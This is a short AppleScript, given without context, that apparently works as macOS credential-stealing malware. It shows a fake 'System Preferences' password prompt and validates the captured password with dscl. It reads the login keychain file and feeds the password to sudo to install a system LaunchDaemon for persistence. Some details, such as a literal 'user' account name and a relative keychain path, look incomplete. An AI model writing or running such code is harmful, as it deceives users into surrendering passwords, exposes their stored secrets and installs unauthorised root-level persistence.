set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
set sourcePath to "Keychains/login.keychain-db"
set contents to read sourcePath
do shell script "echo " & quoted form of secret & " | sudo -S launchctl bootstrap system /Library/LaunchDaemons/com.example.plist"
